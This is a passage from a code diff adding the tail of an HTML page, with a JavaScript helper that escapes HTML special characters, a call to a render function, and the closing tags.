+  }
+
+  function esc(s) {
+    return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+  }
+
+  renderQ();
+</script>
+</body>
+</html>
